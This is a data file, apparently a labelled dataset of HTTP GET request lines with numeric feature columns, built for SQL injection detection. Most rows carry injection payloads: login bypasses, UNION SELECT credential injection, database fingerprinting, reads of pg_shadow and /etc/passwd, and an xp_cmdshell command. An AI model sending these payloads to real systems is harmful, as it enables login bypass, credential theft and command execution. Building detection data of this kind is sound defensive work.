81,1,200,3770,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,5309,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,6706,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
67,1,200,4769,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,3735,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,7745,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,3354,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,2126,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
25,1,200,4805,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
25,1,200,1754,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
25,1,200,5142,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
25,1,200,5943,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
61,1,200,3530,7,31,10,2,1,GET ?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
61,1,200,7215,7,31,10,2,1,GET ?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
61,1,200,1500,7,31,10,2,1,GET ?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
42,1,200,1343,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
42,1,200,5458,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
56,1,200,4596,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5233,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,3305,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,3776,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6980,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5753,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,2520,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6431,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
49,1,200,1343,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
26,1,200,7525,7,7,5,2,1,GET login/?id=' # HTTP/1.1
49,1,200,1239,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,5731,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,1838,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,7025,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,1520,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
64,1,200,7895,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,4497,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,6507,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,1525,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,3168,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
41,1,200,4645,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
41,1,200,6948,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
41,1,200,5607,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
26,1,200,6413,7,7,5,3,1,GET login/?id='/* HTTP/1.1
26,1,200,1382,7,7,5,3,1,GET login/?id='/* HTTP/1.1
26,1,200,1756,7,7,5,3,1,GET login/?id='/* HTTP/1.1
26,1,200,5858,7,7,5,3,1,GET login/?id='/* HTTP/1.1
26,1,200,1295,7,7,5,3,1,GET login/?id='/* HTTP/1.1
35,1,200,6868,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
35,1,200,1409,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
31,1,200,4757,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
37,1,200,6662,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,3963,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,4903,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,7036,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
81,1,200,6306,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7243,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,6588,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,3562,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,5612,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,1999,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7361,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7293,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
35,1,200,4731,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,6967,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,6289,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,4793,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,7094,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,5337,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,5458,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,7927,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
27,1,200,1175,7,4,5,1,1,GET ?id=' or 1=1 – HTTP/1.1
27,1,200,6584,7,4,5,1,1,GET ?id=' or 1=1 – HTTP/1.1
32,1,200,4487,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
26,1,200,6622,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,2618,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,4714,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,7734,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
44,1,200,4089,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,6543,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,7730,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
63,1,200,1422,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,7842,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,1275,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,1453,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
29,1,200,2140,7,9,4,2,0,GET login/?id=or 1=1 HTTP/1.1
29,1,200,3490,7,9,4,2,0,GET login/?id=or 1=1 HTTP/1.1
31,1,200,3941,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
33,1,200,3886,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,2405,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
30,1,200,5761,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,5160,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
75,1,200,2433,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2073,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2000,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,7631,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2318,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3534,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3274,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,5494,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6626,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,1708,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3456,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3621,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
39,1,200,5114,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,7790,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,7658,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,2074,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
55,1,200,4038,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,1164,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3632,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3253,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,1906,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,4964,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,5682,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
97,1,200,3182,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
97,1,200,7191,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
36,1,200,2809,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
65,1,200,6745,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,5801,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,4796,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,6675,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,7546,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,7646,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,5387,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
32,1,200,5002,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,3224,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,7923,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
26,1,200,3730,7,4,6,1,2,GET ?id= or 1=1-- HTTP/1.1
26,1,200,3278,7,4,6,1,2,GET ?id= or 1=1-- HTTP/1.1
53,1,200,3853,7,26,7,2,1,GET login/?id=' group by userid having 1=1-- HTTP/1.1
53,1,200,3106,7,26,7,2,1,GET login/?id=' group by userid having 1=1-- HTTP/1.1
27,1,200,1746,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
27,1,200,4104,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
28,1,200,4315,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,5190,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2615,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2300,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,3062,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,1814,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,6988,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,5497,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
30,1,200,4926,7,4,10,1,1,GET ?id=') or ('1'='1 HTTP/1.1
30,1,200,5365,7,4,10,1,1,GET ?id=') or ('1'='1 HTTP/1.1
30,1,200,3394,7,4,10,1,1,GET ?id=') or ('1'='1 HTTP/1.1
42,1,200,6494,7,11,16,2,1,GET login/?id=')) or (('x'))=(('x HTTP/1.1
42,1,200,6448,7,11,16,2,1,GET login/?id=')) or (('x'))=(('x HTTP/1.1
42,1,200,7024,7,11,16,2,1,GET login/?id=')) or (('x'))=(('x HTTP/1.1
51,1,200,5081,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,1744,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3013,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7924,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
47,1,200,4657,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,3734,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,1424,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
24,1,200,5477,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
33,1,200,7481,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
43,1,200,4961,7,14,12,2,1,GET login/?id=admin') or ('1'='1'# HTTP/1.1
20,1,200,6364,7,2,5,2,1,GET ?id='/* HTTP/1.1
37,1,200,1442,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
59,1,200,1389,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,5518,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,6802,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,2739,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
26,1,200,5057,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,7536,7,7,6,2,1,GET login/?id='^' HTTP/1.1
38,1,200,1032,7,9,13,1,1,GET ?id=admin') or ('1'='1'-- HTTP/1.1
20,1,200,4715,7,2,6,1,1,GET ?id='-- HTTP/1.1
20,1,200,6353,7,2,6,1,1,GET ?id='-- HTTP/1.1
32,1,200,3935,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
32,1,200,7436,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
28,1,200,6461,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
28,1,200,7264,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
28,1,200,5956,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
28,1,200,1942,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
28,1,200,1370,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
32,1,200,2144,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,5875,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,7045,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
37,1,200,4946,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,6880,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,5741,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,6675,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3378,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,6353,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,7682,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3632,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
32,1,200,4439,7,9,4,2,0,GET login/?id= or 0=0 – HTTP/1.1
43,1,200,7461,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,5984,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,3434,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,6858,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
56,1,200,5855,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,3365,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
32,1,200,6692,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
32,1,200,2974,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
33,1,200,6722,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7386,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1264,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2760,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
56,1,200,6948,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,7825,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,3347,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,4809,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
36,1,200,3370,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,7221,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
27,1,200,5069,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
27,1,200,6389,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
32,1,200,6172,7,10,4,2,0,GET login/?id= and 1=1– HTTP/1.1
39,1,200,1792,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
39,1,200,5232,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
32,1,200,1611,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7753,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1987,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
64,1,200,2746,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,3881,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,1143,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,2710,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,2770,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
24,1,200,4134,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,3688,7,7,4,2,1,GET login/?id=' HTTP/1.1
31,1,200,2723,7,12,5,2,1,GET login/?id=admin' # HTTP/1.1
27,1,200,7340,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,1370,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,3420,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
34,1,200,2197,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
34,1,200,1806,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
39,1,200,2211,7,15,8,2,1,GET login/?id=' or 'one'='one– HTTP/1.1
87,1,200,1845,24,20,8,2,1,GET login/?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
37,1,200,5230,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
37,1,200,5269,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
55,1,200,3598,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
55,1,200,6540,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
55,1,200,6140,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
55,1,200,2402,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
31,1,200,1215,7,9,4,2,0,GET login/?id= or 1=1– HTTP/1.1
31,1,200,4760,7,9,4,2,0,GET login/?id= or 1=1– HTTP/1.1
30,1,200,4689,7,9,5,1,1,GET ?id=admin' or 1=1 HTTP/1.1
30,1,200,3937,7,9,5,1,1,GET ?id=admin' or 1=1 HTTP/1.1
30,1,200,1722,7,9,5,1,1,GET ?id=admin' or 1=1 HTTP/1.1
26,1,200,7117,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,7523,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,7410,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
39,1,200,7977,7,9,13,2,1,GET login/?id=') or ('1'='1'-- HTTP/1.1
39,1,200,7033,7,9,13,2,1,GET login/?id=') or ('1'='1'-- HTTP/1.1
43,1,200,3837,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
20,2,200,7466,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,2512,7,2,6,1,1,GET ?id='&' HTTP/1.1
26,1,200,7134,7,7,6,2,1,GET login/?id='-' HTTP/1.1
26,1,200,4829,7,7,6,2,1,GET login/?id='-' HTTP/1.1
34,1,200,4892,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6055,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,2560,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
32,1,200,7789,7,6,12,1,1,GET ?id=') or ('x')=('x HTTP/1.1
33,1,200,2125,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
33,1,200,6435,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
33,1,200,7839,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,6003,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,3503,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,7332,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,5403,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,1361,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,2034,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,1340,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
26,1,200,3204,7,4,5,1,0,GET ?id= or 0=0 # HTTP/1.1
26,1,200,4865,7,4,5,1,0,GET ?id= or 0=0 # HTTP/1.1
64,1,200,6320,21,21,10,2,1,GET login/?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
64,1,200,4057,21,21,10,2,1,GET login/?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
64,1,200,5768,21,21,10,2,1,GET login/?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
44,1,200,1475,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,1584,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3639,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3966,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
42,1,200,6840,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,5244,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
25,1,200,7755,7,4,5,2,2,GET ?id=or 1=1/* HTTP/1.1
25,1,200,1973,7,4,5,2,2,GET ?id=or 1=1/* HTTP/1.1
31,1,200,2688,7,4,10,2,1,GET ?id=' or '1'='1'/* HTTP/1.1
31,1,200,5821,7,4,10,2,1,GET ?id=' or '1'='1'/* HTTP/1.1
31,1,200,2705,7,4,10,2,1,GET ?id=' or '1'='1'/* HTTP/1.1
26,1,200,7994,7,4,5,1,1,GET ?id=' or 1=1– HTTP/1.1
32,1,200,7933,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
32,1,200,7387,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
56,1,200,7474,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,4105,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,6938,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
32,1,200,7999,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
32,1,200,5857,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
38,1,200,6377,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
38,1,200,4066,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
38,1,200,7259,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
34,1,200,6297,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
34,1,200,2326,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
34,1,200,2651,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
34,1,200,1232,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
18,1,200,4969,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,7630,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,3439,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,3062,7,2,4,1,1,GET ?id=' HTTP/1.1
38,1,200,5714,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,4182,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,2020,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,4447,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,1720,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
44,1,200,5309,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
30,1,200,7091,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
30,1,200,2150,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
36,1,200,2930,7,6,16,1,1,GET ?id=')) or (('x'))=(('x HTTP/1.1
34,1,200,6157,7,9,7,2,1,GET login/?id=' or '1′='1 HTTP/1.1
37,1,200,1214,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
34,1,200,3790,7,11,8,1,1,GET ?id=' and 'one'='one– HTTP/1.1
34,1,200,6988,7,11,8,1,1,GET ?id=' and 'one'='one– HTTP/1.1
